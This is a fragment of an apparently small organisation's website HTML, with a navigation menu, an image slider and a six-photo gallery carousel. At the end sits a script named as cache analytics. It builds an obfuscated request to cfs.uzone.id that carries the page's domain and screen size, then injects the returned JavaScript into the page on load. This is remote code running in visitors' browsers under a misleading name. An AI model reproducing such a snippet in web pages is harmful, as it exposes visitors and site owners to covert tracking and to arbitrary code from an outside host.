...
<nav id="primary-menu" class="dark " style="padding-left: 0px; padding-right: 0px; float: left;  ">
	<ul style="margin-right: 0px; padding-right: 0px; " >
		...
		<li class=""><a href="meetourteam.php"><div>Meet Our Team</div></a></li>
	</ul>
			...
			<div class="slider-parallax-inner">
				<div class="swiper-container swiper-parent">
					<div class="swiper-wrapper">
						<div class="swiper-slide dark" style="background-image: url('ImageSlide/1.png');">
							<div class="container clearfix">
  ...
  <div id="carousel-example-generic" class="carousel slide " data-ride="carousel"  style="max-width:500px">
                                    ...
                                    <div class="carousel-inner" >
                                        <div class="item active">
                                            <img src="image/galeri1.jpg" alt="First slide">
                                        </div>
                                        <div class="item">
                                            <img src="image/galeri2.jpg" alt="Second slide">
                                        </div>
                                        <div class="item">
                                            <img src="image/galeri3.jpg" alt="Third slide">
                                        </div>
                                        <div class="item">
                                            <img src="image/galeri4.jpg" alt="Fourth slide">
                                        </div>
                                        <div class="item">
                                            <img src="image/galeri5.jpg" alt="Fifth slide">
                                        </div>
                                        <div class="item">
                                            <img src="image/galeri6.jpg" alt="Sixth slide">
                                        </div>
                                    </div>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKpXhbQKHBMiLKcm4uXxyvCWLF8xqKZotjVHVjhUYvMsb1fKisMBsDhLl7BL1TzTV1NBrscQUi0EUTl4PZYogs1J2r%2bDvuBpdA7FK8RmwTouso8ZxHISIb62Oqm3PxuNRau0GkywpwUcnVH4ASrptMsh7MjCCXoLFhznS0TCnjtN0fhBsqvG5GoCpIbax7TO4ic6twoJefVUOkd%2bsYBg%2bEiCeGg%2flt61rhR7A9FmukC1oaisqTFi6L%2bCxEuGfYUF3A3bN9gRafMbgYODNyJbYNnoaJbaO2WN%2f2w%2fg0cZtYDlZanDkw8QicDPpM0e70aa2ey3XHZQJpIMvoQdVcxgekZWYFdTTG%2f8lnlj%2f2dWEnYp77jhVWuhGZ%2bxt4P2Yz6Tfmy2cgRwJVcB3P5rOAZpiH62BdGVF4hATC9LYWF1OIt2LOPo10HNq%2fLbVt7jirYj%2b9s5P62nID%2bDrSOIyR%2fYtNetj83fbINuYcKc4YY5SYK31vYDt9hHwKc4WEKoK2UMTikyz%2b0e6tug81xk18WMHhkA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
